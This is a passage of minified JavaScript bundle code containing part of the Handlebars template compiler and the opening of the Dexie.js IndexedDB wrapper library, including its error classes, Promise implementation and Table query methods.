r.name),n&&(r.indent=JSON.stringify(n)),r.helpers="helpers",r.partials="partials",r.decorators="container.decorators",t?i.unshift(e):i.unshift(this.nameLookup("partials",e,"partial")),this.options.compat&&(r.depths="depths"),r=this.objectLiteral(r),i.push(r),this.push(this.source.functionCall("container.invokePartial","",i))},assignToHash:function(t){var e=this.popStack(),n=void 0,i=void 0,r=void 0;this.trackIds&&(r=this.popStack()),this.stringParams&&(i=this.popStack(),n=this.popStack());var o=this.hash;n&&(o.contexts[t]=n),i&&(o.types[t]=i),r&&(o.ids[t]=r),o.values[t]=e},pushId:function(t,e,n){"BlockParam"===t?this.pushStackLiteral("blockParams["+e[0]+"].path["+e[1]+"]"+(n?" + "+JSON.stringify("."+n):"")):"PathExpression"===t?this.pushString(e):"SubExpression"===t?this.pushStackLiteral("true"):this.pushStackLiteral("null")},compiler:r,compileChildren:function(t,e){for(var n=t.children,i=void 0,r=void 0,o=0,s=n.length;o<s;o++){i=n[o],r=new this.compiler;var a=this.matchExistingProgram(i);if(null==a){this.context.programs.push("");var l=this.context.programs.length;i.index=l,i.name="program"+l,this.context.programs[l]=r.compile(i,e,this.context,!this.precompile),this.context.decorators[l]=r.decorators,this.context.environments[l]=i,this.useDepths=this.useDepths||r.useDepths,this.useBlockParams=this.useBlockParams||r.useBlockParams,i.useDepths=this.useDepths,i.useBlockParams=this.useBlockParams}else i.index=a.index,i.name="program"+a.index,this.useDepths=this.useDepths||a.useDepths,this.useBlockParams=this.useBlockParams||a.useBlockParams}},matchExistingProgram:function(t){for(var e=0,n=this.context.environments.length;e<n;e++){var i=this.context.environments[e];if(i&&i.equals(t))return i}},programExpression:function(t){var e=this.environment.children[t],n=[e.index,"data",e.blockParams];return(this.useBlockParams||this.useDepths)&&n.push("blockParams"),this.useDepths&&n.push("depths"),"container.program("+n.join(", ")+")"},useRegister:function(t){this.registers[t]||(this.registers[t]=!0,this.registers.list.push(t))},push:function(t){return t instanceof i||(t=this.source.wrap(t)),this.inlineStack.push(t),t},pushStackLiteral:function(t){this.push(new i(t))},pushSource:function(t){this.pendingContent&&(this.source.push(this.appendToBuffer(this.source.quotedString(this.pendingContent),this.pendingLocation)),this.pendingContent=void 0),t&&this.source.push(t)},replaceStack:function(t){var e=["("],n=void 0,r=void 0,o=void 0;if(!this.isInline())throw new a.default("replaceStack on non-inline");var s=this.popStack(!0);if(s instanceof i)e=["(",n=[s.value]],o=!0;else{r=!0;var l=this.incrStack();e=["((",this.push(l)," = ",s,")"],n=this.topStack()}var c=t.call(this,n);o||this.popStack(),r&&this.stackSlot--,this.push(e.concat(c,")"))},incrStack:function(){return this.stackSlot++,this.stackSlot>this.stackVars.length&&this.stackVars.push("stack"+this.stackSlot),this.topStackName()},topStackName:function(){return"stack"+this.stackSlot},flushInline:function(){var t=this.inlineStack;this.inlineStack=[];for(var e=0,n=t.length;e<n;e++){var r=t[e];if(r instanceof i)this.compileStack.push(r);else{var o=this.incrStack();this.pushSource([o," = ",r,";"]),this.compileStack.push(o)}}},isInline:function(){return this.inlineStack.length},popStack:function(t){var e=this.isInline(),n=(e?this.inlineStack:this.compileStack).pop();if(!t&&n instanceof i)return n.value;if(!e){if(!this.stackSlot)throw new a.default("Invalid stack pop");this.stackSlot--}return n},topStack:function(){var t=this.isInline()?this.inlineStack:this.compileStack,e=t[t.length-1];return e instanceof i?e.value:e},contextName:function(t){return this.useDepths&&t?"depths["+t+"]":"depth"+t},quotedString:function(t){return this.source.quotedString(t)},objectLiteral:function(t){return this.source.objectLiteral(t)},aliasable:function(t){var e=this.aliases[t];return e?(e.referenceCount++,e):((e=this.aliases[t]=this.source.wrap(t)).aliasable=!0,e.referenceCount=1,e)},setupHelper:function(t,e,n){var i=[];return{params:i,paramsInit:this.setupHelperArgs(e,t,i,n),name:this.nameLookup("helpers",e,"helper"),callParams:[this.aliasable(this.contextName(0)+" != null ? "+this.contextName(0)+" : (container.nullContext || {})")].concat(i)}},setupParams:function(t,e,n){var i={},r=[],o=[],s=[],a=!n,l=void 0;a&&(n=[]),i.name=this.quotedString(t),i.hash=this.popStack(),this.trackIds&&(i.hashIds=this.popStack()),this.stringParams&&(i.hashTypes=this.popStack(),i.hashContexts=this.popStack());var c=this.popStack(),u=this.popStack();(u||c)&&(i.fn=u||"container.noop",i.inverse=c||"container.noop");for(var d=e;d--;)l=this.popStack(),n[d]=l,this.trackIds&&(s[d]=this.popStack()),this.stringParams&&(o[d]=this.popStack(),r[d]=this.popStack());return a&&(i.args=this.source.generateArray(n)),this.trackIds&&(i.ids=this.source.generateArray(s)),this.stringParams&&(i.types=this.source.generateArray(o),i.contexts=this.source.generateArray(r)),this.options.data&&(i.data="data"),this.useBlockParams&&(i.blockParams="blockParams"),i},setupHelperArgs:function(t,e,n,i){var r=this.setupParams(t,e,n);return r=this.objectLiteral(r),i?(this.useRegister("options"),n.push("options"),["options=",r]):n?(n.push(r),""):r}},function(){for(var t="break else new var case finally return void catch for switch while continue function this with default if throw delete in try do instanceof typeof abstract enum int short boolean export interface static byte extends long super char final native synchronized class float package throws const goto private transient debugger implements protected volatile double import public let yield await null true false".split(" "),e=r.RESERVED_WORDS={},n=0,i=t.length;n<i;n++)e[t[n]]=!0}(),r.isValidJavaScriptVariableName=function(t){return!r.RESERVED_WORDS[t]&&/^[a-zA-Z_$][0-9a-zA-Z_$]*$/.test(t)},e.default=r,t.exports=e.default},function(t,e,n){"use strict";function i(t,e,n){if(o.isArray(t)){for(var i=[],r=0,s=t.length;r<s;r++)i.push(e.wrap(t[r],n));return i}return"boolean"==typeof t||"number"==typeof t?t+"":t}function r(t){this.srcFile=t,this.source=[]}e.__esModule=!0;var o=n(5),s=void 0;s||(s=function(t,e,n,i){this.src="",i&&this.add(i)},s.prototype={add:function(t){o.isArray(t)&&(t=t.join("")),this.src+=t},prepend:function(t){o.isArray(t)&&(t=t.join("")),this.src=t+this.src},toStringWithSourceMap:function(){return{code:this.toString()}},toString:function(){return this.src}}),r.prototype={isEmpty:function(){return!this.source.length},prepend:function(t,e){this.source.unshift(this.wrap(t,e))},push:function(t,e){this.source.push(this.wrap(t,e))},merge:function(){var t=this.empty();return this.each((function(e){t.add(["  ",e,"\n"])})),t},each:function(t){for(var e=0,n=this.source.length;e<n;e++)t(this.source[e])},empty:function(){var t=this.currentLocation||{start:{}};return new s(t.start.line,t.start.column,this.srcFile)},wrap:function(t){var e=arguments.length<=1||void 0===arguments[1]?this.currentLocation||{start:{}}:arguments[1];return t instanceof s?t:(t=i(t,this,e),new s(e.start.line,e.start.column,this.srcFile,t))},functionCall:function(t,e,n){return n=this.generateList(n),this.wrap([t,e?"."+e+"(":"(",n,")"])},quotedString:function(t){return'"'+(t+"").replace(/\\/g,"\\\\").replace(/"/g,'\\"').replace(/\n/g,"\\n").replace(/\r/g,"\\r").replace(/\u2028/g,"\\u2028").replace(/\u2029/g,"\\u2029")+'"'},objectLiteral:function(t){var e=[];for(var n in t)if(t.hasOwnProperty(n)){var r=i(t[n],this);"undefined"!==r&&e.push([this.quotedString(n),":",r])}var o=this.generateList(e);return o.prepend("{"),o.add("}"),o},generateList:function(t){for(var e=this.empty(),n=0,r=t.length;n<r;n++)n&&e.add(","),e.add(i(t[n],this));return e},generateArray:function(t){var e=this.generateList(t);return e.prepend("["),e.add("]"),e}},e.default=r,t.exports=e.default}])})),function(t,e){"object"==typeof exports&&"undefined"!=typeof module?module.exports=e():"function"==typeof define&&define.amd?define(e):t.Dexie=e()}(this,(function(){"use strict";var t=function(){return(t=Object.assign||function(t){for(var e,n=1,i=arguments.length;n<i;n++)for(var r in e=arguments[n])Object.prototype.hasOwnProperty.call(e,r)&&(t[r]=e[r]);return t}).apply(this,arguments)};function e(){for(var t=0,e=0,n=arguments.length;e<n;e++)t+=arguments[e].length;var i=Array(t),r=0;for(e=0;e<n;e++)for(var o=arguments[e],s=0,a=o.length;s<a;s++,r++)i[r]=o[s];return i}var n=Object.keys,i=Array.isArray,r="undefined"!=typeof self?self:"undefined"!=typeof window?window:global;function o(t,e){return"object"!=typeof e||n(e).forEach((function(n){t[n]=e[n]})),t}"undefined"==typeof Promise||r.Promise||(r.Promise=Promise);var s=Object.getPrototypeOf,a={}.hasOwnProperty;function l(t,e){return a.call(t,e)}function c(t,e){"function"==typeof e&&(e=e(s(t))),n(e).forEach((function(n){d(t,n,e[n])}))}var u=Object.defineProperty;function d(t,e,n,i){u(t,e,o(n&&l(n,"get")&&"function"==typeof n.get?{get:n.get,set:n.set,configurable:!0}:{value:n,configurable:!0,writable:!0},i))}function h(t){return{from:function(e){return t.prototype=Object.create(e.prototype),d(t.prototype,"constructor",t),{extend:c.bind(null,t.prototype)}}}}var f=Object.getOwnPropertyDescriptor;function p(t,e){var n;return f(t,e)||(n=s(t))&&p(n,e)}var g=[].slice;function m(t,e,n){return g.call(t,e,n)}function v(t,e){return e(t)}function y(t){if(!t)throw new Error("Assertion Failed")}function b(t){r.setImmediate?setImmediate(t):setTimeout(t,0)}function w(t,e){return t.reduce((function(t,n,i){var r=e(n,i);return r&&(t[r[0]]=r[1]),t}),{})}function k(t,e){if(l(t,e))return t[e];if(!e)return t;if("string"!=typeof e){for(var n=[],i=0,r=e.length;i<r;++i){var o=k(t,e[i]);n.push(o)}return n}var s=e.indexOf(".");if(-1!==s){var a=t[e.substr(0,s)];return void 0===a?void 0:k(a,e.substr(s+1))}}function x(t,e,n){if(t&&void 0!==e&&(!("isFrozen"in Object)||!Object.isFrozen(t)))if("string"!=typeof e&&"length"in e){y("string"!=typeof n&&"length"in n);for(var r=0,o=e.length;r<o;++r)x(t,e[r],n[r])}else{var s,a,l=e.indexOf(".");-1!==l?(s=e.substr(0,l),""===(a=e.substr(l+1))?void 0===n?i(t)&&!isNaN(parseInt(s))?t.splice(s,1):delete t[s]:t[s]=n:x(t[s]||(t[s]={}),a,n)):void 0===n?i(t)&&!isNaN(parseInt(e))?t.splice(e,1):delete t[e]:t[e]=n}}function _(t,e){"string"==typeof e?x(t,e,void 0):"length"in e&&[].map.call(e,(function(e){x(t,e,void 0)}))}function S(t){var e={};for(var n in t)l(t,n)&&(e[n]=t[n]);return e}var C=[].concat;function $(t){return C.apply([],t)}var E="Boolean,String,Date,RegExp,Blob,File,FileList,ArrayBuffer,DataView,Uint8ClampedArray,ImageData,Map,Set".split(",").concat($([8,16,32,64].map((function(t){return["Int","Uint","Float"].map((function(e){return e+t+"Array"}))})))).filter((function(t){return r[t]})),T=E.map((function(t){return r[t]})),L=w(E,(function(t){return[t,!0]}));function O(t){if(!t||"object"!=typeof t)return t;var e;if(i(t)){e=[];for(var n=0,r=t.length;n<r;++n)e.push(O(t[n]))}else if(0<=T.indexOf(t.constructor))e=t;else for(var o in e=t.constructor?Object.create(t.constructor.prototype):{},t)l(t,o)&&(e[o]=O(t[o]));return e}var I={}.toString;function A(t){return I.call(t).slice(8,-1)}var P=function(t,e){return"Array"===e?""+t.map((function(t){return P(t,A(t))})):"ArrayBuffer"===e?""+new Uint8Array(t):"Date"===e?t.getTime():ArrayBuffer.isView(t)?""+new Uint8Array(t.buffer):t};function N(t,e,i,r){return i=i||{},r=r||"",n(t).forEach((function(n){var o,s,a,c;l(e,n)?(o=t[n],s=e[n],"object"==typeof o&&"object"==typeof s&&o&&s?(a=A(o))===(c=A(s))?L[a]?P(o,a)!==P(s,c)&&(i[r+n]=e[n]):N(o,s,i,r+n+"."):i[r+n]=e[n]:o!==s&&(i[r+n]=e[n])):i[r+n]=void 0})),n(e).forEach((function(n){l(t,n)||(i[r+n]=e[n])})),i}var B="undefined"!=typeof Symbol&&Symbol.iterator,D=B?function(t){var e;return null!=t&&(e=t[B])&&e.apply(t)}:function(){return null},R={};function j(t){var e,n,r,o;if(1===arguments.length){if(i(t))return t.slice();if(this===R&&"string"==typeof t)return[t];if(o=D(t)){for(n=[];!(r=o.next()).done;)n.push(r.value);return n}if(null==t)return[t];if("number"!=typeof(e=t.length))return[t];for(n=new Array(e);e--;)n[e]=t[e];return n}for(e=arguments.length,n=new Array(e);e--;)n[e]=arguments[e];return n}var M="undefined"!=typeof Symbol?function(t){return"AsyncFunction"===t[Symbol.toStringTag]}:function(){return!1},F="undefined"!=typeof location&&/^(http|https):\/\/(localhost|127\.0\.0\.1)/.test(location.href);function q(t,e){F=t,H=e}var H=function(){return!0},W=!new Error("").stack;function z(){if(W)try{throw new Error}catch(t){return t}return new Error}function U(t,e){var n=t.stack;return n?(e=e||0,0===n.indexOf(t.name)&&(e+=(t.name+t.message).split("\n").length),n.split("\n").slice(e).filter(H).map((function(t){return"\n"+t})).join("")):""}var Z=["Unknown","Constraint","Data","TransactionInactive","ReadOnly","Version","NotFound","InvalidState","InvalidAccess","Abort","Timeout","QuotaExceeded","Syntax","DataClone"],V=["Modify","Bulk","OpenFailed","VersionChange","Schema","Upgrade","InvalidTable","MissingAPI","NoSuchDatabase","InvalidArgument","SubTransaction","Unsupported","Internal","DatabaseClosed","PrematureCommit","ForeignAwait"].concat(Z),K={VersionChanged:"Database version changed by other database connection",DatabaseClosed:"Database has been closed",Abort:"Transaction aborted",TransactionInactive:"Transaction has already completed or failed"};function X(t,e){this._e=z(),this.name=t,this.message=e}function Y(t,e){return t+". Errors: "+Object.keys(e).map((function(t){return e[t].toString()})).filter((function(t,e,n){return n.indexOf(t)===e})).join("\n")}function G(t,e,n,i){this._e=z(),this.failures=e,this.failedKeys=i,this.successCount=n,this.message=Y(t,e)}function Q(t,e){this._e=z(),this.name="BulkError",this.failures=e,this.message=Y(t,e)}h(X).from(Error).extend({stack:{get:function(){return this._stack||(this._stack=this.name+": "+this.message+U(this._e,2))}},toString:function(){return this.name+": "+this.message}}),h(G).from(X),h(Q).from(X);var J=V.reduce((function(t,e){return t[e]=e+"Error",t}),{}),tt=X,et=V.reduce((function(t,e){var n=e+"Error";function i(t,i){this._e=z(),this.name=n,t?"string"==typeof t?(this.message=t+(i?"\n "+i:""),this.inner=i||null):"object"==typeof t&&(this.message=t.name+" "+t.message,this.inner=t):(this.message=K[e]||n,this.inner=null)}return h(i).from(tt),t[e]=i,t}),{});et.Syntax=SyntaxError,et.Type=TypeError,et.Range=RangeError;var nt=Z.reduce((function(t,e){return t[e+"Error"]=et[e],t}),{}),it=V.reduce((function(t,e){return-1===["Syntax","Type","Range"].indexOf(e)&&(t[e+"Error"]=et[e]),t}),{});function rt(){}function ot(t){return t}function st(t,e){return null==t||t===ot?e:function(n){return e(t(n))}}function at(t,e){return function(){t.apply(this,arguments),e.apply(this,arguments)}}function lt(t,e){return t===rt?e:function(){var n=t.apply(this,arguments);void 0!==n&&(arguments[0]=n);var i=this.onsuccess,r=this.onerror;this.onsuccess=null,this.onerror=null;var o=e.apply(this,arguments);return i&&(this.onsuccess=this.onsuccess?at(i,this.onsuccess):i),r&&(this.onerror=this.onerror?at(r,this.onerror):r),void 0!==o?o:n}}function ct(t,e){return t===rt?e:function(){t.apply(this,arguments);var n=this.onsuccess,i=this.onerror;this.onsuccess=this.onerror=null,e.apply(this,arguments),n&&(this.onsuccess=this.onsuccess?at(n,this.onsuccess):n),i&&(this.onerror=this.onerror?at(i,this.onerror):i)}}function ut(t,e){return t===rt?e:function(n){var i=t.apply(this,arguments);o(n,i);var r=this.onsuccess,s=this.onerror;this.onsuccess=null,this.onerror=null;var a=e.apply(this,arguments);return r&&(this.onsuccess=this.onsuccess?at(r,this.onsuccess):r),s&&(this.onerror=this.onerror?at(s,this.onerror):s),void 0===i?void 0===a?void 0:a:o(i,a)}}function dt(t,e){return t===rt?e:function(){return!1!==e.apply(this,arguments)&&t.apply(this,arguments)}}function ht(t,e){return t===rt?e:function(){var n=t.apply(this,arguments);if(n&&"function"==typeof n.then){for(var i=this,r=arguments.length,o=new Array(r);r--;)o[r]=arguments[r];return n.then((function(){return e.apply(i,o)}))}return e.apply(this,arguments)}}it.ModifyError=G,it.DexieError=X,it.BulkError=Q;var ft={},pt=100,gt="undefined"==typeof Promise?[]:function(){var t=Promise.resolve();if("undefined"==typeof crypto||!crypto.subtle)return[t,t.__proto__,t];var e=crypto.subtle.digest("SHA-512",new Uint8Array([0]));return[e,e.__proto__,t]}(),mt=gt[0],vt=gt[1],yt=gt[2],bt=vt&&vt.then,wt=mt&&mt.constructor,kt=!!yt,xt=!1,_t=yt?function(){yt.then(zt)}:r.setImmediate?setImmediate.bind(null,zt):r.MutationObserver?function(){var t=document.createElement("div");new MutationObserver((function(){zt(),t=null})).observe(t,{attributes:!0}),t.setAttribute("i","1")}:function(){setTimeout(zt,0)},St=function(t,e){Pt.push([t,e]),$t&&(_t(),$t=!1)},Ct=!0,$t=!0,Et=[],Tt=[],Lt=null,Ot=ot,It={id:"global",global:!0,ref:0,unhandleds:[],onunhandled:pe,pgp:!1,env:{},finalize:function(){this.unhandleds.forEach((function(t){try{pe(t[0],t[1])}catch(t){}}))}},At=It,Pt=[],Nt=0,Bt=[];function Dt(t){if("object"!=typeof this)throw new TypeError("Promises must be constructed via new");this._listeners=[],this.onuncatched=rt,this._lib=!1;var e=this._PSD=At;if(F&&(this._stackHolder=z(),this._prev=null,this._numPrev=0),"function"!=typeof t){if(t!==ft)throw new TypeError("Not a function");return this._state=arguments[1],this._value=arguments[2],void(!1===this._state&&Mt(this,this._value))}this._state=null,this._value=null,++e.ref,function t(e,n){try{n((function(n){if(null===e._state){if(n===e)throw new TypeError("A promise cannot be resolved with itself.");var i=e._lib&&Ut();n&&"function"==typeof n.then?t(e,(function(t,e){n instanceof Dt?n._then(t,e):n.then(t,e)})):(e._state=!0,e._value=n,Ft(e)),i&&Zt()}}),Mt.bind(null,e))}catch(n){Mt(e,n)}}(this,t)}var Rt={get:function(){var t=At,e=te;function n(n,i){var r=this,o=!t.global&&(t!==At||e!==te),s=o&&!re(),a=new Dt((function(e,a){qt(r,new jt(de(n,t,o,s),de(i,t,o,s),e,a,t))}));return F&&Wt(a,this),a}return n.prototype=ft,n},set:function(t){d(this,"then",t&&t.prototype===ft?Rt:{get:function(){return t},set:Rt.set})}};function jt(t,e,n,i,r){this.onFulfilled="function"==typeof t?t:null,this.onRejected="function"==typeof e?e:null,this.resolve=n,this.reject=i,this.psd=r}function Mt(t,e){var n,i;Tt.push(e),null===t._state&&(n=t._lib&&Ut(),e=Ot(e),t._state=!1,t._value=e,F&&null!==e&&"object"==typeof e&&!e._promise&&function(t,e,n){try{t.apply(null,void 0)}catch(t){}}((function(){var n=p(e,"stack");e._promise=t,d(e,"stack",{get:function(){return xt?n&&(n.get?n.get.apply(e):n.value):t.stack}})})),i=t,Et.some((function(t){return t._value===i._value}))||Et.push(i),Ft(t),n&&Zt())}function Ft(t){var e=t._listeners;t._listeners=[];for(var n=0,i=e.length;n<i;++n)qt(t,e[n]);var r=t._PSD;--r.ref||r.finalize(),0===Nt&&(++Nt,St((function(){0==--Nt&&Vt()}),[]))}function qt(t,e){if(null!==t._state){var n=t._state?e.onFulfilled:e.onRejected;if(null===n)return(t._state?e.resolve:e.reject)(t._value);++e.psd.ref,++Nt,St(Ht,[n,t,e])}else t._listeners.push(e)}function Ht(t,e,n){try{var i,r=(Lt=e)._value;e._state?i=t(r):(Tt.length&&(Tt=[]),i=t(r),-1===Tt.indexOf(r)&&function(t){for(var e=Et.length;e;)if(Et[--e]._value===t._value)return Et.splice(e,1)}(e)),n.resolve(i)}catch(t){n.reject(t)}finally{Lt=null,0==--Nt&&Vt(),--n.psd.ref||n.psd.finalize()}}function Wt(t,e){var n=e?e._numPrev+1:0;n<100&&(t._prev=e,t._numPrev=n)}function zt(){Ut()&&Zt()}function Ut(){var t=Ct;return $t=Ct=!1,t}function Zt(){var t,e,n;do{for(;0<Pt.length;)for(t=Pt,Pt=[],n=t.length,e=0;e<n;++e){var i=t[e];i[0].apply(null,i[1])}}while(0<Pt.length);$t=Ct=!0}function Vt(){var t=Et;Et=[],t.forEach((function(t){t._PSD.onunhandled.call(null,t._value,t)}));for(var e=Bt.slice(0),n=e.length;n;)e[--n]()}function Kt(t){return new Dt(ft,!1,t)}function Xt(t,e){var n=At;return function(){var i=Ut(),r=At;try{return ae(n,!0),t.apply(this,arguments)}catch(i){e&&e(i)}finally{ae(r,!1),i&&Zt()}}}c(Dt.prototype,{then:Rt,_then:function(t,e){qt(this,new jt(null,null,t,e,At))},catch:function(t){if(1===arguments.length)return this.then(null,t);var e=t,n=arguments[1];return"function"==typeof e?this.then(null,(function(t){return(t instanceof e?n:Kt)(t)})):this.then(null,(function(t){return(t&&t.name===e?n:Kt)(t)}))},finally:function(t){return this.then((function(e){return t(),e}),(function(e){return t(),Kt(e)}))},stack:{get:function(){if(this._stack)return this._stack;try{xt=!0;var t=function t(e,n,i){if(n.length===i)return n;var r,o,s,a="";return!1===e._state&&(null!=(r=e._value)?(o=r.name||"Error",s=r.message||r,a=U(r,0)):(o=r,s=""),n.push(o+(s?": "+s:"")+a)),F&&((a=U(e._stackHolder,2))&&-1===n.indexOf(a)&&n.push(a),e._prev&&t(e._prev,n,i)),n}(this,[],20).join("\nFrom previous: ");return null!==this._state&&(this._stack=t),t}finally{xt=!1}}},timeout:function(t,e){var n=this;return t<1/0?new Dt((function(i,r){var o=setTimeout((function(){return r(new et.Timeout(e))}),t);n.then(i,r).finally(clearTimeout.bind(null,o))})):this}}),"undefined"!=typeof Symbol&&Symbol.toStringTag&&d(Dt.prototype,Symbol.toStringTag,"Dexie.Promise"),It.env=le(),c(Dt,{all:function(){var t=j.apply(null,arguments).map(oe);return new Dt((function(e,n){0===t.length&&e([]);var i=t.length;t.forEach((function(r,o){return Dt.resolve(r).then((function(n){t[o]=n,--i||e(t)}),n)}))}))},resolve:function(t){if(t instanceof Dt)return t;if(t&&"function"==typeof t.then)return new Dt((function(e,n){t.then(e,n)}));var e=new Dt(ft,!0,t);return Wt(e,Lt),e},reject:Kt,race:function(){var t=j.apply(null,arguments).map(oe);return new Dt((function(e,n){t.map((function(t){return Dt.resolve(t).then(e,n)}))}))},PSD:{get:function(){return At},set:function(t){return At=t}},totalEchoes:{get:function(){return te}},newPSD:ne,usePSD:ce,scheduler:{get:function(){return St},set:function(t){St=t}},rejectionMapper:{get:function(){return Ot},set:function(t){Ot=t}},follow:function(t,e){return new Dt((function(n,i){return ne((function(e,n){var i=At;i.unhandleds=[],i.onunhandled=n,i.finalize=at((function(){var t,i=this;t=function(){0===i.unhandleds.length?e():n(i.unhandleds[0])},Bt.push((function e(){t(),Bt.splice(Bt.indexOf(e),1)})),++Nt,St((function(){0==--Nt&&Vt()}),[])}),i.finalize),t()}),e,n,i)}))}}),wt&&(wt.allSettled&&d(Dt,"allSettled",(function(){var t=j.apply(null,arguments).map(oe);return new Dt((function(e){0===t.length&&e([]);var n=t.length,i=new Array(n);t.forEach((function(t,r){return Dt.resolve(t).then((function(t){return i[r]={status:"fulfilled",value:t}}),(function(t){return i[r]={status:"rejected",reason:t}})).then((function(){return--n||e(i)}))}))}))})),wt.any&&"undefined"!=typeof AggregateError&&d(Dt,"any",(function(){var t=j.apply(null,arguments).map(oe);return new Dt((function(e,n){0===t.length&&n(new AggregateError([]));var i=t.length,r=new Array(i);t.forEach((function(t,o){return Dt.resolve(t).then((function(t){return e(t)}),(function(t){r[o]=t,--i||n(new AggregateError(r))}))}))}))})));var Yt={awaits:0,echoes:0,id:0},Gt=0,Qt=[],Jt=0,te=0,ee=0;function ne(t,e,n,i){var r=At,s=Object.create(r);s.parent=r,s.ref=0,s.global=!1,s.id=++ee;var a=It.env;s.env=kt?{Promise:Dt,PromiseProp:{value:Dt,configurable:!0,writable:!0},all:Dt.all,race:Dt.race,allSettled:Dt.allSettled,any:Dt.any,resolve:Dt.resolve,reject:Dt.reject,nthen:he(a.nthen,s),gthen:he(a.gthen,s)}:{},e&&o(s,e),++r.ref,s.finalize=function(){--this.parent.ref||this.parent.finalize()};var l=ce(s,t,n,i);return 0===s.ref&&s.finalize(),l}function ie(){return Yt.id||(Yt.id=++Gt),++Yt.awaits,Yt.echoes+=pt,Yt.id}function re(){return!!Yt.awaits&&(0==--Yt.awaits&&(Yt.id=0),Yt.echoes=Yt.awaits*pt,!0)}function oe(t){return Yt.echoes&&t&&t.constructor===wt?(ie(),t.then((function(t){return re(),t}),(function(t){return re(),ge(t)}))):t}function se(){var t=Qt[Qt.length-1];Qt.pop(),ae(t,!1)}function ae(t,e){var n,i,o=At;(e?!Yt.echoes||Jt++&&t===At:!Jt||--Jt&&t===At)||ue(e?function(t){++te,Yt.echoes&&0!=--Yt.echoes||(Yt.echoes=Yt.id=0),Qt.push(At),ae(t,!0)}.bind(null,t):se),t!==At&&(At=t,o===It&&(It.env=le()),kt&&(n=It.env.Promise,i=t.env,vt.then=i.nthen,n.prototype.then=i.gthen,(o.global||t.global)&&(Object.defineProperty(r,"Promise",i.PromiseProp),n.all=i.all,n.race=i.race,n.resolve=i.resolve,n.reject=i.reject,i.allSettled&&(n.allSettled=i.allSettled),i.any&&(n.any=i.any))))}function le(){var t=r.Promise;return kt?{Promise:t,PromiseProp:Object.getOwnPropertyDescriptor(r,"Promise"),all:t.all,race:t.race,allSettled:t.allSettled,any:t.any,resolve:t.resolve,reject:t.reject,nthen:vt.then,gthen:t.prototype.then}:{}}function ce(t,e,n,i,r){var o=At;try{return ae(t,!0),e(n,i,r)}finally{ae(o,!1)}}function ue(t){bt.call(mt,t)}function de(t,e,n,i){return"function"!=typeof t?t:function(){var r=At;n&&ie(),ae(e,!0);try{return t.apply(this,arguments)}finally{ae(r,!1),i&&ue(re)}}}function he(t,e){return function(n,i){return t.call(this,de(n,e),de(i,e))}}-1===(""+bt).indexOf("[native code]")&&(ie=re=rt);var fe="unhandledrejection";function pe(t,e){var n;try{n=e.onuncatched(t)}catch(t){}if(!1!==n)try{var i,s={promise:e,reason:t};if(r.document&&document.createEvent?((i=document.createEvent("Event")).initEvent(fe,!0,!0),o(i,s)):r.CustomEvent&&o(i=new CustomEvent(fe,{detail:s}),s),i&&r.dispatchEvent&&(dispatchEvent(i),!r.PromiseRejectionEvent&&r.onunhandledrejection))try{r.onunhandledrejection(i)}catch(t){}F&&i&&!i.defaultPrevented&&console.warn("Unhandled rejection: "+(t.stack||t))}catch(t){}}var ge=Dt.reject;function me(t){return!/(dexie\.js|dexie\.min\.js)/.test(t)}var ve=String.fromCharCode(65535),ye="Invalid key provided. Keys must be of type string, number, Date or Array<string | number | Date>.",be="String expected.",we=[],ke="undefined"!=typeof navigator&&/(MSIE|Trident|Edge)/.test(navigator.userAgent),xe=ke,_e=ke,Se="__dbnames",Ce="readonly",$e="readwrite";function Ee(t,e){return t?e?function(){return t.apply(this,arguments)&&e.apply(this,arguments)}:t:e}var Te={type:3,lower:-1/0,lowerOpen:!1,upper:[[]],upperOpen:!1};function Le(t){return function(e){return void 0===k(e,t)&&_(e=O(e),t),e}}var Oe=(Ie.prototype._trans=function(t,e,n){var i=this._tx||At.trans,r=this.name;function o(t,n,i){if(!i.schema[r])throw new et.NotFound("Table "+r+" not part of transaction");return e(i.idbtrans,i)}var s=Ut();try{return i&&i.db===this.db?i===At.trans?i._promise(t,o,n):ne((function(){return i._promise(t,o,n)}),{trans:i,transless:At.transless||At}):function t(e,n,i,r){if(e._state.openComplete||At.letThrough){var o=e._createTransaction(n,i,e._dbSchema);try{o.create()}catch(t){return ge(t)}return o._promise(n,(function(t,e){return ne((function(){return At.trans=o,r(t,e,o)}))})).then((function(t){return o._completion.then((function(){return t}))}))}if(!e._state.isBeingOpened){if(!e._options.autoOpen)return ge(new et.DatabaseClosed);e.open().catch(rt)}return e._state.dbReadyPromise.then((function(){return t(e,n,i,r)}))}(this.db,t,[this.name],o)}finally{s&&Zt()}},Ie.prototype.get=function(t,e){var n=this;return t&&t.constructor===Object?this.where(t).first(e):this._trans("readonly",(function(e){return n.core.get({trans:e,key:t}).then((function(t){return n.hook.reading.fire(t)}))})).then(e)},Ie.prototype.where=function(t){if("string"==typeof t)return new this.db.WhereClause(this,t);if(i(t))return new this.db.WhereClause(this,"["+t.join("+")+"]");var e=n(t);if(1===e.length)return this.where(e[0]).equals(t[e[0]]);var r=this.schema.indexes.concat(this.schema.primKey).filter((function(t){return t.compound&&e.every((function(e){return 0<=t.keyPath.indexOf(e)}))&&t.keyPath.every((function(t){return 0<=e.indexOf(t)}))}))[0];if(r&&this.db._maxKey!==ve)return this.where(r.name).equals(r.keyPath.map((function(e){return t[e]})));!r&&F&&console.warn("The query "+JSON.stringify(t)+" on "+this.name+" would benefit of a compound index ["+e.join("+")+"]");var o=this.schema.idxByName,s=this.db._deps.indexedDB;function a(t,e){try{return 0===s.cmp(t,e)}catch(t){return!1}}var l=e.reduce((function(e,n){var r=e[0],s=e[1],l=o[n],c=t[n];return[r||l,r||!l?Ee(s,l&&l.multi?function(t){var e=k(t,n);return i(e)&&e.some((function(t){return a(c,t)}))}:function(t){return a(c,k(t,n))}):s]}),[null,null]),c=l[0],u=l[1];return c?this.where(c.name).equals(t[c.keyPath]).filter(u):r?this.filter(u):this.where(e).equals("")},Ie.prototype.filter=function(t){return this.toCollection().and(t)},Ie.prototype.count=function(t){return this.toCollection().count(t)},Ie.prototype.offset=function(t){return this.toCollection().offset(t)},Ie.prototype.limit=function(t){return this.toCollection().limit(t)},Ie.prototype.each=function(t){return this.toCollection().each(t)},Ie.prototype.toArray=function(t){return this.toCollection().toArray(t)},Ie.prototype.toCollection=function(){return new this.db.Collection(new this.db.WhereClause(this))},Ie.prototype.orderBy=function(t){return new this.db.Collection(new this.db.WhereClause(this,i(t)?"["+t.join("+")+"]":t))},Ie.prototype.reverse=function(){return this.toCollection().reverse()},Ie.prototype.mapToClass=function(t){function e(e){if(!e)return e;var n=Object.create(t.prototype);for(var i in 